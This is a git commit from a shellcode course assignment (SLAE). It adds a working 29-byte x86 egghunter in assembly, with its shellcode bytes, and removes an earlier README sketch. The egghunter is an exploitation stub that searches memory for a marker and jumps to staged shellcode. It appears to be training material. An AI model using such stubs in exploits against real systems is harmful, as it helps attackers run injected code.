386c3a77d90a0776a965e978f7ca6e5277678caf
Paolo Stivanin <info@paolostivanin.com>
2014-04-01 01:02:55 +0200

    assignment 3 completed :)

--- asm-src/Assignment_3/README.md
+++ asm-src/Assignment_3/README.md
@@ -6,25 +6,3 @@ Instructions:
 * Study about egghunter
 * Make a working demo
 * Make it configurable for different payload
-
-PoC:
-----
-
-```
-_start:
-	jmp short stack
-
-getStack:
-	pop eax
-
-ll:	cmp eax,egg
-	cmp eax+4,egg
-	jne la
-	jmp eax
-
-la:	inc eax
-	jmp ll
-
-stack:
-	call getStack
-```
--- asm-src/Assignment_3/egghunter.asm
+++ asm-src/Assignment_3/egghunter.asm
@@ -1,9 +1,17 @@
-;Description:	Assignment #3 (EggHunter, XX bytes)
-;Shellcode:		
+;Description:	Assignment #3 (EggHunter, 29 bytes)
+;Shellcode:		\xd9\xee\x9b\xd9\x74\x24\xf4\x58\x40\x81\x78\xf8\xaa\xbb\xcc\xdd\x75\xf6\x81\x78\xfc\xaa\xbb\xcc\xdd\x75\xed\xff\xe0
 ;Author: 		Paolo Stivanin <https://github.com/polslinux>
 ;SLAE ID:		526
 
 global _start
 section .text
 _start:
-	
+	fldz
+	fstenv [esp-0xc]
+	pop eax
+ll:	inc eax
+	cmp dword [eax-8],0xddccbbaa
+	jne ll
+	cmp dword [eax-4],0xddccbbaa
+	jne ll
+	jmp eax
